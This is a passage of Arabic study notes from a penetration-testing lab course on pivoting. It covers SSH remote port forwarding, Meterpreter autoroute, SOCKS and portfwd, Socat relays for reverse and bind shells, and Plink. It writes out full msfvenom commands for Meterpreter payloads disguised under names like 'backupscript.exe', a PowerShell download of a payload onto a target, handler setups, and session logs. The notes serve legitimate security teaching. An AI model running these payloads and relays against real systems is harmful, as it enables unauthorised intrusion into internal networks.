اسم الملف.

```text
backupscript.exe
```

---

يبقى الـ Payload بيقول:

> لما تتشغل...

> روح اتصل بـ
> 172.16.5.129:8080


---

## تشغيل الـ Listener

بعدها بنفتح Metasploit.

```bash
use exploit/multi/handler
```

بعدها:

```text
Payload

windows/x64/meterpreter/reverse_https
```

وبعدين:

```text
LHOST

0.0.0.0
```

---

## ليه 0.0.0.0؟

معناها:

> اسمع على كل Interfaces.

مش Interface معين.

---

بعدها:

```text
LPORT

8000
```

يبقى الـ Listener شغال على:

```text
Kali

↓

8000
```

---

## نقل الـ Payload

بنستخدم:

```bash
scp backupscript.exe ubuntu@IP:~/
```

ليه؟

علشان ننقل الملف للـ Ubuntu.

---

## بعدين

على Ubuntu:

```bash
python3 -m http.server 8123
```

وده هيعمل Web Server.

يبقى الملف هيبقى متاح على:

```text
http://172.16.5.129:8123/
```

---

## تحميله على Windows

من PowerShell:

```powershell
Invoke-WebRequest `
-Uri http://172.16.5.129:8123/backupscript.exe `
-OutFile C:\backupscript.exe
```

لاحظ:

Windows حمل الملف من Ubuntu.

لأنهم في نفس الشبكة.

---

## أهم أمر في الفصل

```bash
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@IP -vN
```

ده لازم نفهمه كلمة كلمة.

---

## معنى -R

اختصار:

```text
Remote Port Forwarding
```

يعني:

افتح بورت على الجهاز البعيد.

---

خلينا نفك الأمر.

```text
172.16.5.129
```

هو عنوان Ubuntu الداخلي.

---

```text
8080
```

افتح Listener هنا.

---

```text
0.0.0.0
```

يعني ابعت البيانات لأي Interface عندي.

---

```text
8000
```

البورت اللي عليه Metasploit.

---

يبقى الجملة كلها معناها:

> "يا Ubuntu، افتح البورت 8080 على عنوانك الداخلي، وأي اتصال يوصلك عليه ابعته داخل الـ SSH Tunnel إلى جهازي على البورت 8000."

---

## يعني الترافيك هيمشي إزاي؟

الـ Windows هيشوف:

```text
172.16.5.129:8080
```

وده بالنسبة له جهاز عادي في نفس الشبكة.

هيتصل بيه.

بعدها يحصل:

```text
Windows
      │
      ▼
Ubuntu
172.16.5.129:8080
      │
      ▼
SSH Tunnel
      │
      ▼
Kali
0.0.0.0:8000
      │
      ▼
Metasploit Listener
```

لاحظ إن Windows **مش عارف** إن الاتصال رايح للـ Kali.

هو فاكر إنه بيكلم Ubuntu فقط.

---

## ليه استخدمنا -vN ؟

```bash
-v
```

يعني:

Verbose.

اطبع Logs.

---

```bash
-N
```

يعني:

متفتحليش Shell.

أنا مش داخل SSH علشان Terminal.

أنا داخل علشان الـ Tunnel بس.

---

## شرح الـ Logs

لما الـ Payload يشتغل.

Ubuntu هيطبع:

```text
listen 172.16.5.129 port 8080
```

يعني:

فيه حد وصل للبورت.

---

بعدها:

```text
originator

172.16.5.19
```

يعني:

اللي اتصل هو Windows.

---

بعدها:

```text
connected

0.0.0.0:8000
```

يعني:

بعت الاتصال لجهازك.

يبقى الـ Tunnel اشتغل بنجاح.

---

## ليه Meterpreter بيقول

```text
127.0.0.1
```

ودي نقطة ناس كتير بتتلخبط فيها.

هيظهر:

```text
Session opened

127.0.0.1
```

مش:

```text
172.16.5.19
```

ليه؟

لأن الاتصال وصل لـ Metasploit من خلال الـ SSH Socket المحلي.

يعني بالنسبة لـ Metasploit:

اللي اتصل بيه هو:

```text
localhost
```

لكن في الحقيقة:

```text
Windows

↓

Ubuntu

↓

SSH Tunnel

↓

Metasploit
```

---

## الفرق بين Local و Remote Port Forwarding

|Local Port Forwarding (`-L`)|Remote Port Forwarding (`-R`)|
|---|---|
|بيفتح بورت على جهازك|بيفتح بورت على الجهاز البعيد|
|الهدف إنك توصل لخدمة موجودة على الجهاز البعيد|الهدف إن الجهاز البعيد يوصل لخدمة موجودة عندك|
|حركة البيانات: **Kali → Ubuntu**|حركة البيانات: **Windows → Ubuntu → Kali**|
|مفيد للوصول إلى خدمات داخلية مثل MySQL|مفيد لاستقبال Reverse Shell أو Meterpreter عندما الهدف لا يستطيع الوصول مباشرة لجهازك|

---

## الخلاصة

الفكرة الأساسية في **Remote (Reverse) Port Forwarding** هي حل مشكلة إن الجهاز المستهدف لا يستطيع الوصول مباشرة إلى جهاز المهاجم.

بدل ما الـ Reverse Shell يحاول الاتصال بـ **Kali** (وهو غير قابل للوصول من شبكة Windows)، نجعله يتصل بـ **Ubuntu Pivot Host** على بورت محدد (مثل 8080). بعد ذلك، يقوم الـ **SSH Remote Port Forward (`-R`)** بتحويل هذا الاتصال عبر الـ SSH Tunnel إلى الـ Listener الموجود على جهاز المهاجم (مثل Metasploit على البورت 8000).

بالتالي يكون مسار الاتصال:

```text
Windows Target
      │
      ▼
Ubuntu Pivot Host (172.16.5.129:8080)
      │
      ▼
SSH Remote Tunnel
      │
      ▼
Kali (Metasploit Listener :8000)
```

وده هو السبب اللي بيخلي الـ **Reverse Shell** أو **Meterpreter Session** ينجح حتى لو جهاز Windows معندوش أي Route مباشر يوصل بيه إلى جهاز الـ Kali.


----
# Layer 5
> **الفكرة الأساسية في الجزء ده:**> 
> في الدروس اللي فاتت كنا بنستخدم **SSH** علشان نعمل Pivoting.

> لكن هنا هنتعلم إن **Meterpreter نفسه يقدر يعمل Pivoting** من غير ما تحتاج SSH خالص.

---

## قبل ما نبدأ...

إحنا عندنا السيناريو ده:

```text
              Kali (Attacker)
             10.10.14.18
                    │
                    │
             Meterpreter Session
                    │
                    ▼
        Ubuntu Pivot Host
        10.129.202.64
        172.16.5.129
                    │
        -----------------------
        │                     │
        ▼                     ▼
 Windows               Internal Network
172.16.5.19
```

بدل ما يبقى عندنا:

```text
SSH Session
```

بقينا عندنا:

```text
Meterpreter Session
```

ودي نقطة الفرق الكبيرة.

---

## ليه نستخدم Meterpreter بدل SSH؟

السؤال الطبيعي:

> طالما SSH شغال كويس... ليه أستخدم Meterpreter؟

لأن Meterpreter بيديك إمكانيات أكتر بكتير.

مثلاً:

- تشغيل Modules
    
- رفع ملفات
    
- تنزيل ملفات
    
- Pivoting
    
- Privilege Escalation Modules
    
- Autoroute
    
- SOCKS Proxy
    
- Port Forwarding
    

كل ده من غير ما تفتح SSH.

---

## أول خطوة

لازم يبقى عندنا Meterpreter على الـ Ubuntu.

يعني هنعمل Payload.

المقال استخدم:

```bash
msfvenom \
-p linux/x64/meterpreter/reverse_tcp \
LHOST=10.10.14.18 \
LPORT=8080 \
-f elf \
-o backupjob
```

خلينا نشرحه.

---

## msfvenom

ده البرنامج المسؤول عن إنشاء Payloads.

---

## -p

يعني نوع الـ Payload.

```text
linux/x64/meterpreter/reverse_tcp
```

يعني:

- Linux
    
- 64 Bit
    
- Meterpreter
    
- Reverse TCP
    

---

## LHOST

ده عنوان جهازك.

```text
10.10.14.18
```

لأن الـ Ubuntu هيعمل Reverse Connection ليك.

---

## LPORT

```text
8080
```

البورت اللي هيطلع عليه الاتصال.

---

## -f elf

لأن Linux بيشغل ملفات:

```text
ELF
```

مش EXE.

---

## -o

اسم الملف.

```text
backupjob
```

وده الملف التنفيذي.

---

## بعد كده

هنفتح Listener.

في Metasploit.

```bash
use exploit/multi/handler
```

---

بعدها:

```text
set payload
```

لازم يبقى نفس الـ Payload.

---

بعدها:

```text
set LHOST 0.0.0.0
```

ليه؟

علشان يسمع على كل الـ Interfaces.

---

بعدها:

```text
set LPORT 8080
```

ثم:

```text
run
```

بقى عندنا Listener جاهز يستقبل الـ Meterpreter.

---

## تشغيل الـ Payload

ننقل الملف للـ Ubuntu.

ثم:

```bash
chmod +x backupjob
```

ليه؟

علشان يبقى Executable.

---

بعدها:

```bash
./backupjob
```

أول ما يتشغل...

هيعمل Reverse Connection.

ونشوف:

```text
Meterpreter session opened
```

يبقى تمام.

---

## دلوقتي عندنا Meterpreter

يعني بقينا جوا Ubuntu.

السؤال:

إزاي نكتشف الأجهزة الداخلية؟

---

## Ping Sweep

المقال استخدم:

```bash
run post/multi/gather/ping_sweep \
RHOSTS=172.16.5.0/23
```

وده Module داخل Metasploit.

---

## بيعمل إيه؟

يبعت Ping لكل الأجهزة.

لكن...

مين اللي بيبعت الـ Ping؟

الإجابة:

مش Kali.

الـ Ubuntu.

وده الفرق الكبير.

يعني:

```text
Kali

↓

Meterpreter

↓

Ubuntu

↓

Ping

↓

172.16.5.x
```

وده بيسمحلك تكتشف الأجهزة اللي في الشبكة الداخلية.

---

## طيب لو مش عايز تستخدم Module؟

المقال قال:

اعمل Loop.

في Linux:

```bash
for i in {1..254}
do
 ping -c 1 172.16.5.$i
done
```

يعني:

اعمل Ping لكل IP.

---

وفي CMD:

```cmd
for /L %i in (1 1 254)
do ping
```

---

وفي PowerShell:

```powershell
1..254 |
% {
 Test-Connection
}
```

كلهم نفس الفكرة.

---

## ليه ساعات Ping بيفشل؟

المقال ذكر سببين مهمين:

## أول سبب

ARP Cache.

أول مرة الجهاز يتصل...

لازم يعرف الـ MAC Address.

فممكن أول Ping يضيع.

علشان كده جرب مرتين.

---

## السبب الثاني

Firewall.

ممكن يكون مانع ICMP.

ساعتها Ping هيقول:

```text
Host Down
```

لكن الجهاز شغال.

علشان كده ساعات بنستخدم Nmap بدل Ping.

---

## طيب إزاي أعمل Nmap؟

في SSH كنا بنستخدم:

```text
ProxyChains
```

مع:

```text
SSH SOCKS
```

لكن هنا مفيش SSH.

يبقى نعمل SOCKS داخل Metasploit نفسه.

---

## إنشاء SOCKS Proxy

الموديول:

```bash
use auxiliary/server/socks_proxy
```

---

بعدها:

```text
set SRVPORT 9050
```

يعني:

اسمع على:

```text
9050
```

---

بعدها:

```text
set VERSION 4a
```

ليه 4a؟

ده نوع الـ SOCKS.

---

ثم:

```text
run
```

دلوقتي Metasploit نفسه بقى Proxy Server.

---

## إعداد ProxyChains

بنفتح:

```text
/etc/proxychains.conf
```

ونضيف:

```text
socks4 127.0.0.1 9050
```

يعني:

أي برنامج يستخدم ProxyChains...

هيعدي من Metasploit.

---

## المشكلة

لسه Proxy مش عارف يوصل للشبكة.

ليه؟

لأنه ميعرفش:

```text
172.16.5.0/23
```

تتبعت لمين.

---

## الحل

Autoroute.

وده من أجمل Modules في Metasploit.

---

## Autoroute

```bash
use post/multi/manage/autoroute
```

بعدها:

```text
set SESSION 1
```

يعني:

استخدم الـ Meterpreter Session رقم 1.

---

بعدها:

```text
set SUBNET

172.16.5.0
```

---

ثم:

```text
run
```

هيضيف Route جديد.

يعني:

أي Packet رايحة للشبكة دي...

عديها من الـ Ubuntu.

---

## إيه اللي حصل فعليًا؟

قبل:

```text
Kali

↓

172.16.5.x

❌
```

بعد Autoroute:

```text
Kali

↓

Meterpreter

↓

Ubuntu

↓

172.16.5.x

✅
```

---

## أتأكد إزاي؟

```bash
run autoroute -p
```

هيطلع:

```text
172.16.5.0

Gateway

Session 1
```

يبقى الـ Route اتضاف.

---

## دلوقتي Nmap

بقى ينفع:

```bash
proxychains nmap \
172.16.5.19 \
-p3389 \
-sT
```

لاحظ:

```text
ProxyChains

↓

SOCKS

↓

Meterpreter

↓

Ubuntu

↓

Windows
```

وده بالظبط نفس اللي كنا بنعمله بالـ SSH، لكن هنا الوسيط هو Meterpreter.

---

## Meterpreter Port Forwarding

دلوقتي المقال رجع لموضوع Port Forwarding.

لكن باستخدام Meterpreter.

---

## الأمر

```bash
portfwd add \
-l 3300 \
-p 3389 \
-r 172.16.5.19
```

خلينا نشرحه.

---

## -l

Local Port.

يعني افتح عندي:

```text
3300
```

---

## -p

البورت البعيد.

```text
3389
```

بتاع RDP.

---

## -r

عنوان الجهاز.

```text
172.16.5.19
```

يبقى الأمر معناه:

> "افتح البورت 3300 على جهازي، وأي اتصال ييجي عليه ابعته عبر جلسة Meterpreter إلى الجهاز 172.16.5.19 على البورت 3389."

---

## النتيجة

بدل:

```text
172.16.5.19:3389
```

هستخدم:

```text
localhost:3300
```

وأفتح RDP:

```bash
xfreerdp \
/v:localhost:3300
```

وكأن الخدمة موجودة على جهازي.

---

## Reverse Port Forwarding في Meterpreter

زي SSH بالظبط.

لكن باستخدام:

```text
portfwd
```

---

الأمر:

```bash
portfwd add \
-R \
-l 8081 \
-p 1234 \
-L 10.10.14.18
```

خلينا نفهمه.

---

## -R

يعني:

Reverse Port Forward.

---

## -l 8081

البورت على جهازك (Kali) اللي عليه الـ Listener.

---

## -p 1234

البورت اللي هيكون مفتوح على الـ Ubuntu.

---

## -L

عنوان جهازك.

```text
10.10.14.18
```

يبقى:

أي اتصال يوصل:

```text
Ubuntu:1234
```

يتحول لـ:

```text
Kali:8081
```

عبر جلسة Meterpreter.

---

## بعد كده

نشغل Listener على:

```text
8081
```

في Metasploit.

---

## إنشاء Payload للويندوز

المهم هنا:

```bash
msfvenom \
-p windows/x64/meterpreter/reverse_tcp \
LHOST=172.16.5.129 \
LPORT=1234
```

لاحظ:

الـ Windows هيتصل بـ:

```text
172.16.5.129
```

مش بالـ Kali.

ليه؟

لأنه شايف Ubuntu فقط.

---

## مسار الاتصال بالكامل

بعد تشغيل الـ Payload، الاتصال هيكون بالشكل ده:

```text
Windows
172.16.5.19
        │
        ▼
Ubuntu Pivot
172.16.5.129:1234
        │
        ▼
Meterpreter Reverse Port Forward
        │
        ▼
Kali
10.10.14.18:8081
        │
        ▼
Metasploit Handler
        │
        ▼
Meterpreter Session
```

وده يخليك تستقبل جلسة Meterpreter من جهاز داخلي، رغم إنه ميقدرش يتصل بجهازك مباشرة.

---

## الفرق بين SSH وMeterpreter في الـ Pivoting

| SSH                                   | Meterpreter                                   |
| ------------------------------------- | --------------------------------------------- |
| بيعتمد على خدمة SSH موجودة على الجهاز | بيعتمد على جلسة Meterpreter فقط               |
| بنستخدم `-L` و`-D` و`-R`              | بنستخدم `portfwd` و`autoroute` و`socks_proxy` |
| مناسب لو عندك SSH Credentials         | مناسب لو عندك Meterpreter Session             |
| Proxy بيتم عن طريق SSH                | Proxy بيتم من خلال Metasploit نفسه            |
| إدارة الـ Routes يدوية غالبًا         | `autoroute` بيضيفها تلقائيًا                  |

---

## الخلاصة

في الفصل ده اتعلمنا إن **Meterpreter يقدر يعمل كل اللي كنا بنعمله بـ SSH تقريبًا**:

- إنشاء **SOCKS Proxy** داخل Metasploit.
    
- إضافة **Routes** للشبكات الداخلية باستخدام `autoroute`.
    
- تشغيل أدوات زي **Nmap** من خلال `proxychains` والـ SOCKS Proxy.
    
- تنفيذ **Local Port Forwarding** باستخدام `portfwd add`.
    
- تنفيذ **Reverse Port Forwarding** باستخدام `portfwd add -R`.
    

وده بيخلي جلسة Meterpreter نفسها تتحول إلى **Pivot Host** كامل، من غير الحاجة إلى خدمة SSH على الجهاز المخترق.

# Layer 6
## قبل ما نبدأ...

إحنا لحد دلوقتي اتعلمنا أكتر من طريقة علشان نعمل Pivoting.

1. SSH Local Port Forwarding (`-L`)
    
2. SSH Dynamic Port Forwarding (`-D`)
    
3. SSH Remote Port Forwarding (`-R`)
    
4. Meterpreter Port Forwarding
    
5. Meterpreter Autoroute
    

دلوقتي هنشوف أداة جديدة اسمها **Socat**.

المقال بيقول:

> **Socat هو Bidirectional Relay Tool.**

يعني برنامج يقدر يربط بين اتصالين (Connections) ويخلي البيانات اللي تدخل من واحد تخرج من التاني، بدون الحاجة إلى SSH Tunneling.

---

## يعني إيه Relay؟

تخيل عندك شخصين:

```text
محمد  -------------------->  أحمد
```

لكن بينهم واحد اسمه كريم.

```text
محمد

↓

كريم

↓

أحمد
```

كل اللي كريم بيعمله:

- يستقبل الرسالة
    
- يبعتهالها زي ما هي
    

هو مش بيغيرها.

مش بيفهمها.

بس بينقلها.

وده بالظبط اللي Socat بيعمله.

---

## طيب هو بيشتغل إزاي؟

الفكرة كلها:

بدل ما Windows يتصل بجهازك مباشرة...

هيتصل بالـ Ubuntu.

والـ Ubuntu هيبعت كل البيانات لجهازك.

يعني:

```text
Windows

↓

Ubuntu (Socat)

↓

Kali
```

لاحظ إن Ubuntu هنا مجرد **وسيط (Relay/Redirector)**.

---

## السيناريو

عندنا:

```text
               Kali
          10.10.14.18
                 │
                 │
        -----------------
        │ Ubuntu Pivot  │
        │172.16.5.129   │
        -----------------
                 │
                 │
        -----------------
        │ Windows Target│
        │172.16.5.19    │
        -----------------
```

Windows ميقدرش يكلم:

```text
10.10.14.18
```

لكن يقدر يكلم:

```text
172.16.5.129
```

وده كفاية.

---

## أول خطوة

تشغيل Socat.

المقال استخدم:

```bash
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

خلينا نشرحه جزء جزء.

---

## أول جزء

```text
TCP4-LISTEN
```

يعني:

اعمل Listener.

على IPv4.

---

بعدها:

```text
8080
```

يعني:

اسمع على:

```text
Ubuntu:8080
```

---

بعدها:

```text
fork
```

وده جزء مهم جدًا.

---

## يعني إيه fork؟

تخيل إن أول جهاز اتصل.

لو مفيش:

```text
fork
```

هيبقى:

```text
Windows1

↓

Socat
```

وبس.

أي حد تاني هيجيله:

```text
Connection Refused
```

لكن مع:

```text
fork
```

كل Client ياخد Process لوحده.

يعني:

```text
Windows1

↓

Socat Process1

Windows2

↓

Socat Process2

Windows3

↓

Socat Process3
```

يبقى يقدر يخدم أكتر من اتصال في نفس الوقت.

---

## الجزء التاني

```text
TCP4:10.10.14.18:80
```

يعني:

أي بيانات تستقبلها...

ابعتها إلى:

```text
10.10.14.18

Port 80
```

---

## يبقى الأمر كله معناه

> "يا Ubuntu، افتح البورت 8080، وأي حد يتصل بيه ابعت كل البيانات إلى جهاز Kali على البورت 80."

---

## شكل الاتصال

هيبقى:

```text
Windows

↓

172.16.5.129:8080

↓

Socat

↓

10.10.14.18:80

↓

Metasploit
```

---

## إنشاء الـ Payload

بعد كده عمل:

```bash
msfvenom \
-p windows/x64/meterpreter/reverse_https \
LHOST=172.16.5.129 \
LPORT=8080 \
-f exe \
-o backupscript.exe
```

لاحظ حاجة.

---

## ليه LHOST = Ubuntu؟

مش Kali.

لأن Windows يقدر يوصل لـ Ubuntu فقط.

فالـ Payload هيقول:

> "أنا هتصل بـ Ubuntu."

---

## وليه LPORT = 8080؟

لأن ده البورت اللي Socat فاتحه.

يبقى الـ Payload هيتصل بـ:

```text
172.16.5.129:8080
```

مش أكتر من كده.

---

## بعد كده

نشغل Metasploit.

```bash
use exploit/multi/handler
```

ثم:

```text
Payload

windows/x64/meterpreter/reverse_https
```

---

بعدها:

```text
LHOST

0.0.0.0
```

يعني:

اسمع على كل الـ Interfaces.

---

بعدها:

```text
LPORT

80
```

استنى...

ليه هنا 80؟

وليه فوق كان 8080؟

---

## دي أهم نقطة في الفصل

فيه بورتين مختلفين.

## على Ubuntu

Socat فاتح:

```text
8080
```

---

## على Kali

Metasploit بيسمع على:

```text
80
```

وسقات هو اللي بيربط بينهم.

يعني:

```text
Ubuntu

8080

↓

Socat

↓

Kali

80
```

علشان كده الـ Listener لازم يكون على 80.

---

## بعد تشغيل الـ Payload

الـ Windows هيعمل:

```text
connect

172.16.5.129:8080
```

هيستقبل مين؟

Socat.

---

بعدها Socat يعمل:

```text
connect

10.10.14.18:80
```

---

فتبقى حركة البيانات بالشكل ده:

```text
Windows Target
172.16.5.19
        │
        ▼
Ubuntu Pivot
172.16.5.129:8080
        │
        ▼
Socat Relay
        │
        ▼
Kali
10.10.14.18:80
        │
        ▼
Metasploit Listener
```

---

## شرح الـ Logs

ظهر:

```text
handling request

from

10.129.202.64
```

ليه ظهر Ubuntu؟

مش Windows؟

لأن Metasploit شايف آخر جهاز اتصل بيه.

واللي اتصل فعلاً هو:

```text
Socat
```

مش Windows.

يعني بالنسبة لـ Metasploit:

```text
Windows

↓

Ubuntu

↓

أنا
```

فهو فاكر إن Ubuntu هو العميل (Client).

---

بعدها:

```text
Meterpreter session opened
```

يعني:

الـ Reverse Shell وصل بنجاح.

---

بعدها:

```text
meterpreter > getuid
```

طلع:

```text
INLANEFREIGHT\victor
```

وده معناه إن الـ Session بقت شغالة بصلاحيات المستخدم **victor** على جهاز Windows.

---

## طب هو Socat أحسن من SSH؟

مش بالضرورة.

كل واحد له استخدامه.

|SSH Tunneling|Socat|
|---|---|
|يحتاج خدمة SSH على الـ Pivot Host|لا يحتاج SSH|
|يوفر تشفير (Encryption)|لا يوفر تشفير بنفسه، هو مجرد Relay|
|يدعم Authentication|لا يعتمد على Authentication|
|مناسب لو عندك SSH Credentials|مناسب لو عندك Shell فقط وتقدر تشغل Socat|
|أوامر أكثر وتعقيد أكبر|بسيط جدًا في إعادة توجيه الاتصالات|

---

## إمتى أستخدم Socat؟

لو:

- عندك **Shell عادي** على الجهاز.
    
- مفيش خدمة SSH.
    
- تقدر ترفع وتشغل ملف Socat.
    
- محتاج تعمل **Port Redirection** بسرعة.
    

أما لو عندك SSH شغال، فغالبًا استخدام SSH Tunneling هيكون أسهل وأكثر أمانًا لأنه مشفر.

---

## الخلاصة

الفكرة في **Socat** إنه بيشتغل كـ **Relay أو Redirector** فقط:

1. يفتح Listener على الـ **Pivot Host** (Ubuntu) على بورت معين (مثل 8080).
    
2. أي اتصال يوصل للبورت ده، ينقله كما هو إلى جهازك (Kali) على البورت اللي عليه الـ Listener (مثل 80).
    
3. الـ Windows Payload يعتقد أنه يتصل بـ **Ubuntu**، بينما في الحقيقة Socat بيعيد توجيه الاتصال إلى **Metasploit** على جهازك.
    
4. على عكس SSH Tunneling، **Socat لا يعمل تشفير أو مصادقة بنفسه**؛ وظيفته الأساسية هي **تمرير البيانات بين نقطتين**.

----
# Layer 7
## Socat Redirection with a Bind Shell

## أول حاجة... نفتكر الفرق بين Reverse Shell و Bind Shell

لأن الجزء ده كله مبني على الفرق ده.

## Reverse Shell

في الـ Reverse Shell...

**الضحية هي اللي بتبدأ الاتصال.**

يعني:

```text
Windows
    │
    │ Connect
    ▼
Attacker
```

يعني الـ Windows هو اللي بيقول:

> "أنا هروح أتصل بالمهاجم."

وده اللي كنا بنعمله في الدرس اللي فات.

---

## Bind Shell

أما الـ Bind Shell...

العكس تمامًا.

الضحية هي اللي بتفتح Listener.

وتستنى حد يتصل بيها.

يعني:

```text
Windows
8443 LISTEN
      ▲
      │
Attacker Connects
```

يعني:

- Windows يفتح Port
    
- المهاجم هو اللي يعمل Connect
    

---

## السيناريو عندنا

```text
                Kali
          10.10.14.18
                │
                │
          Metasploit
                │
                │
        -------------------
        │ Ubuntu Pivot    │
        │10.129.202.64    │
        │172.16.5.129     │
        -------------------
                │
                │
        -------------------
        │ Windows         │
        │172.16.5.19      │
        -------------------
```
![[Pasted image 20260708220551.png]]

المشكلة؟

الـ Kali مش شايف Windows.

لكن Ubuntu شايفه.

---

## طيب نعمل إيه؟

بدل ما Kali يحاول يوصل لـ Windows مباشرة...

هنخليه يوصل لـ Ubuntu.

وUbuntu يحول الاتصال للـ Windows.

وده بالظبط دور Socat.

---

## الفكرة كلها

بدل:

```text
Kali

↓

Windows
```

هيبقى:

```text
Kali

↓

Ubuntu (Socat)

↓

Windows
```

---

## إنشاء الـ Payload

المقال استخدم:

```bash
msfvenom \
-p windows/x64/meterpreter/bind_tcp \
-f exe \
-o backupjob.exe \
LPORT=8443
```

خلينا نشرحه.

---

## -p

```text
windows/x64/meterpreter/bind_tcp
```

لاحظ الكلمة المهمة:

```text
bind_tcp
```

مش

```text
reverse_tcp
```

يعني:

بدل ما الـ Payload يعمل Connect...

هيفتح Listener.

---

## LPORT

```text
8443
```

يعني بعد تشغيل الملف على Windows...

هيبقى فيه خدمة شغالة:

```text
Windows

8443 LISTEN
```

أي حد يعرف يوصل للبورت ده...

هيفتح Meterpreter Session.

---

## -f exe

لأن الملف هيشتغل على Windows.

---

## -o

اسم الملف.

```text
backupjob.exe
```

وده اللي هنرفعه على الجهاز.

---

## بعد تشغيل الـ Payload

شكل الشبكة بقى:

```text
Windows

8443 LISTEN
```

يعني Windows مستني.

لكن المشكلة...

إحنا منقدرش نوصل للبورت ده.

ليه؟

لأن Windows موجود في شبكة داخلية.

---

## هنا ييجي دور Socat

المقال استخدم:

```bash
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

وده أهم أمر في الفصل.

---

## نشرحه جزء جزء

## TCP4-LISTEN

يعني:

افتح Listener.

---

## 8080

يبقى Ubuntu هيعمل:

```text
Ubuntu

8080 LISTEN
```

---

## fork

زي ما شرحنا قبل كده.

كل Connection ياخد Process لوحده.

---

## TCP4

هنبعت باستخدام IPv4.

---

## 172.16.5.19

ده Windows.

---

## 8443

البورت اللي الـ Bind Shell فاتحه.

---

يبقى الأمر كله معناه:

> "يا Ubuntu، افتح البورت 8080، وأي حد يتصل بيه ابعت الاتصال للجهاز Windows على البورت 8443."

يعني Ubuntu بقى مجرد **Relay** بين المهاجم والـ Bind Shell.

---

## شكل الاتصال

بعد تشغيل Socat.

يبقى:

```text
Kali

↓

Ubuntu:8080

↓

Socat

↓

Windows:8443
```

---

## تشغيل الـ Handler

بعدها بنفتح:

```bash
use exploit/multi/handler
```

---

بعدها:

```text
set payload

windows/x64/meterpreter/bind_tcp
```

لاحظ.

لازم يبقى:

```text
bind_tcp
```

مش Reverse.

---

بعدها:

```text
set RHOST

10.129.202.64
```

استنى...

ليه كتب Ubuntu؟

مش Windows؟

---

## دي أهم نقطة في الفصل

إحنا في الحقيقة **مش بنوصل لـ Windows مباشرة**.

إحنا بنتصل بـ:

```text
Ubuntu
```

لأن Ubuntu فاتح:

```text
8080
```

وهو اللي هيبعت الاتصال لـ Windows.

فـ بالنسبة لـ Metasploit...

الهدف هو Ubuntu.

لكن Ubuntu مجرد Redirector.

---

بعدها:

```text
set LPORT

8080
```

ليه؟

لأن ده البورت اللي Socat فاتحه.

ثم:

```bash
run
```

الـ Handler هيحاول يعمل اتصال بـ Ubuntu على 8080، وسقات هيكمل الطريق لحد Windows على 8443.

---

## حركة الاتصال

دي أهم رسمة في الجزء كله.

```text
               Kali
                 │
                 │ Connect
                 ▼
      Ubuntu Pivot
      Port 8080
                 │
                 │
                 ▼
             Socat
                 │
                 │
                 ▼
Windows
Port 8443 LISTEN
```

لاحظ الفرق.

في الـ Reverse Shell كان:

```text
Windows

↓

Kali
```

أما هنا:

```text
Kali

↓

Windows
```

لكن عن طريق Ubuntu.

---

## بعد تشغيل الـ Payload

أول ما الملف يشتغل.

Windows يعمل:

```text
8443 LISTEN
```

بعدها Metasploit يعمل:

```text
Connect

↓

Ubuntu:8080

↓

Socat

↓

Windows:8443
```

---

## شرح الـ Logs

ظهر:

```text
Sending stage
```

يعني Metasploit بدأ يبعت الـ Meterpreter Stage للـ Windows.

---

بعدها:

```text
Meterpreter session opened
```

يبقى الاتصال نجح.

---

بعدها:

```text
getuid
```

طلع:

```text
INLANEFREIGHT\victor
```

يعني بقينا داخلين على Windows بصلاحيات المستخدم **victor**.

---

## الفرق بين Reverse Socat و Bind Socat

|Reverse باستخدام Socat|Bind باستخدام Socat|
|---|---|
|Windows هو اللي يبدأ الاتصال|Kali هو اللي يبدأ الاتصال|
|الـ Payload نوعه `reverse_https` أو `reverse_tcp`|الـ Payload نوعه `bind_tcp`|
|Socat يحول الاتصال من Ubuntu إلى Kali|Socat يحول الاتصال من Ubuntu إلى Windows|
|يحتاج الـ Windows يقدر يوصل لـ Ubuntu|يحتاج Kali يقدر يوصل لـ Ubuntu، وUbuntu يقدر يوصل لـ Windows|

---

## مقارنة بين Reverse Shell و Bind Shell

|Reverse Shell|Bind Shell|
|---|---|
|الضحية تعمل اتصال بالمهاجم|المهاجم يعمل اتصال بالضحية|
|الضحية تفتح اتصال خارجي|الضحية تفتح Listener داخلي|
|مناسب عندما يكون الاتصال الصادر (Outbound) مسموحًا|مناسب عندما يكون الاتصال الوارد (Inbound) مسموحًا ويمكن الوصول للجهاز|
|غالبًا هو الأكثر استخدامًا في الاختبارات العملية|أقل استخدامًا لأن كثيرًا من الجدران النارية تمنع الاتصالات الواردة|

---

## الخلاصة

الفكرة هنا إننا استخدمنا **Socat كـ Port Redirector** لكن مع **Bind Shell** بدل Reverse Shell:

1. شغّلنا Payload من نوع **`bind_tcp`** على Windows، فبدأ يستمع على البورت **8443**.
    
2. شغّلنا **Socat** على Ubuntu ليستمع على **8080** ويحوّل أي اتصال إلى **Windows:8443**.
    
3. جعلنا **Metasploit** يتصل بـ **Ubuntu:8080**، بينما Socat أعاد توجيه الاتصال إلى الـ Bind Shell على Windows.
    
4. النتيجة النهائية هي الحصول على **Meterpreter Session** على جهاز Windows، رغم إن جهاز Kali لا يستطيع الوصول إليه مباشرة، لأن Ubuntu قام بدور **Pivot Host** و**Relay** بين الطرفين.

----
# Layer 8
## SSH for Windows: Plink.exe

---
## قبل ما نبدأ...

إحنا طول الكورس تقريبًا كنا بنستخدم:

```bash
ssh
```

على Linux.

زي:

```bash
ssh -D 9050 ubuntu@10.129.15.50
```

وده كان بيعمل:

- SSH Session
    
- SOCKS Proxy
    
- Dynamic Port Forwarding
    
- Pivoting
    

---

## طيب لو جهازك Windows؟

هنا المشكلة.

زمان (قبل Windows 10 إصدار 1809 تقريبًا)...

Windows **مكنش فيه SSH Client بشكل افتراضي**.

يعني لو كتبت:

```cmd
ssh
```

كان هيقولك:

```text
'SSH' is not recognized
```

علشان كده الناس كانت بتستخدم برنامج مشهور جدًا اسمه:


PuTTY

---

$# يعني إيه PuTTY؟

هو برنامج بيخليك تعمل:

- SSH
    
- SCP
    
- Telnet
    
- Serial Connections
    

لكن بواجهة رسومية.

كان تقريبًا أشهر برنامج SSH على Windows لسنين طويلة.

---

## طيب إيه هو Plink؟

المقال بيقول:

> Plink اختصار لـ **PuTTY Link**.

وده جزء من حزمة PuTTY.

لكن بدل ما يبقى بواجهة رسومية...

هو:

```text
Command Line SSH Client
```

يعني شغال من CMD أو PowerShell.

---

## ببساطة

لو على Linux عندك:

```bash
ssh
```

فعلى Windows القديم كان عندك:

```cmd
plink.exe
```

